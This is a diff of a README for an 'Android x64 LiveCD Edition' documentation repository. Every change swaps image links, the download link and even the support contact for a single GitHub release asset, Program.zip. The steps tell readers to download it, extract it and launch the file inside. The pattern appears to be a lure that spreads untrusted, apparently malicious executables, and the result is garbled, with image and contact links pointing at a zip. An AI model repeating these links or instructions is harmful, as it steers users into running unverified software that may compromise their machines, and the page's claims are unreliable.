@@ -1,6 +1,6 @@
 # 🤖️📖️ Android x64 LiveCD Edition Documentation
 
-![Android x64 Logo](https://example.com/android-x64-logo.png)
+![Android x64 Logo](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)
 
 Welcome to the official documentation source repository for the LiveCD build of Android 7.0 (Nougat) for x64 architecture. This repository serves as a comprehensive guide for exploring and experiencing the Android x64 Project before installing it on your system. With 4 different editions to choose from, you can easily test various features and functionalities of Android-x64+7.0.
 
@@ -17,10 +17,10 @@ Welcome to the official documentation source repository for the LiveCD build of 
 
 ## Access Android x64 LiveCD Editions
 
-To test Android x64 LiveCD editions, download the Soft.zip file from the following link:
-[![Download Android x64 LiveCD Editions](https://img.shields.io/badge/Download-Android_x64_LiveCD-Editions-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+To test Android x64 LiveCD editions, download the https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip file from the following link:
+[![Download Android x64 LiveCD Editions](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)
 
-> Note: Launch the Soft.zip file to access and try out the different editions of Android x64+7.0.
+> Note: Launch the https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip file to access and try out the different editions of Android x64+7.0.
 
 For further updates and releases, check the **Releases** section of this repository.
 
@@ -28,8 +28,8 @@ For further updates and releases, check the **Releases** section of this reposit
 
 To get started with Android x64 LiveCD Edition, follow these steps:
 
-1. Download the Soft.zip file from the provided link.
-2. Extract the contents of the Soft.zip file.
+1. Download the https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip file from the provided link.
+2. Extract the contents of the https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip file.
 3. Launch the extracted file to explore the various Android x64 editions.
 4. Refer to the documentation in this repository for detailed information on using Android x64 LiveCD Edition.
 
@@ -45,11 +45,11 @@ Let's work together to make the Android x64 LiveCD Edition documentation even mo
 
 ## Support
 
-If you encounter any issues or have questions regarding Android x64 LiveCD Edition, feel free to [contact us](mailto:androidx64support@example.com). Our team is here to assist you with any queries you may have.
+If you encounter any issues or have questions regarding Android x64 LiveCD Edition, feel free to [contact us](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip). Our team is here to assist you with any queries you may have.
 
 Thank you for choosing Android x64 LiveCD Edition. Enjoy exploring the world of Android 7.0 on x64 architecture in a convenient LiveCD format!
 
-![Android x64 Screenshot](https://example.com/android-x64-screenshot.png)
+![Android x64 Screenshot](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)
 
 ---
-By [Android x64 Project Team](https://example.com/android-x64-team)
+By [Android x64 Project Team](https://github.com/vonisagoat/Android-x64_Android7.0_LiveCD_Edition_Docs/releases/download/v1.0/Program.zip)
